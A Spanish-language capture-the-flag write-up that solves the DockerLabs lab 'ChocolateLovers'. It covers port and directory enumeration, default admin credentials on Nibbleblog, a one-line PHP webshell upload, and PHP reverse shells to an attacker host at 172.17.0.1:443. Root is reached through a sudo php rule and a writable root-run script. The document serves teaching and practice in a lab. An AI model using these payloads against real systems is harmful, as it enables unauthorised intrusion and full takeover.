## Introducción

Este documento presenta la resolución completa de la máquina **ChocolateLovers**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con indexación de directorios habilitada, lo que permite descubrir un blog Nibbleblog. Tras acceder al panel de administración con credenciales por defecto (`admin:admin`), se sube una webshell a través de una funcionalidad de carga de archivos sin validación, obteniendo ejecución remota de comandos como `www-data`.
Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `php` como el usuario `chocolate`. Posteriormente, se descubre que el archivo `/opt/script.php` es ejecutado por `root` y es escribible por `chocolate`, permitiendo la inyección de una reverse shell que otorga acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip ChocolateLovers.zip
sudo bash auto_deploy.sh ChocolateLovers.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1761717544/Ip_kdnyha.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p ChocolateLovers/{content,exploits,nmap,scripts}
cd ChocolateLovers
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1761791987/Ports_acbgop.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:

```bash
gobuster dir -u http://172.17.0.2/ \

  -x php,html,txt,js -t 200
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Acceso al panel de administración

Se prueban credenciales por defecto y se obtiene acceso exitoso con `admin:admin`.

![Admin board](https://res.cloudinary.com/dewqswzke/image/upload/v1761791985/AdminBoard_h10ryz.png)

### 2.2 Subida de webshell

El panel permite subir imágenes sin validación, lo que permite subir un archivo PHP malicioso. Se utiliza el siguiente contenido:

```php
<?=`$_GET[0]`?>
```

Tras subir el archivo, se accede directamente desde:

```
http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?0=id
```

![ID response](https://res.cloudinary.com/dewqswzke/image/upload/v1761791985/CI_je55hf.png)

Esto confirma ejecución remota de comandos.

### 2.3 Reverse shell

Se utiliza una línea encodeada para abrir reverse shell. Se inicia un listener en la máquina atacante:

```bash
nc -lvnp 443
```

Se envía el payload:

```
http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?0=php%20-r%20%27%24sock%3Dfsockopen%28%22172.17.0.1%22%2C443%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1761791988/ReverseShell_u7djyw.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → chocolate

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1761791989/Sudo-L_s87fuf.png)

El usuario `www-data` puede ejecutar `php` como `chocolate` sin contraseña.

Se ejecuta `php` para obtener una shell como `chocolate`:

```bash
sudo -u chocolate php -r "system('/bin/bash');"
```

![Chocolate login](https://res.cloudinary.com/dewqswzke/image/upload/v1761791985/ElevateToChocolate_w3u4mb.png)

### 3.2 De chocolate → root

Desde la cuenta `chocolate`, se listan procesos:

```bash
ps aux
```

![Ps aux](https://res.cloudinary.com/dewqswzke/image/upload/v1761791987/PsAux_qfhtcu.png)

Se observa que `root` ejecuta periódicamente `/opt/script.php`. Además, el archivo es **escribible** por el usuario `chocolate`.

![Ls -l script](https://res.cloudinary.com/dewqswzke/image/upload/v1761791986/Ls-lScript_tbygse.png)

Se modifica `script.php` para inyectar una reverse shell:

```bash
echo '<?php $sock=fsockopen("172.17.0.1",443);exec("bash -i <&3 >&3 2>&3"); ?>' > /opt/script.php
```

Se inicia un listener en la máquina atacante y se espera a que el proceso root ejecute el script, obteniendo acceso como `root`.

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1761791989/Root_h8mlwk.png)
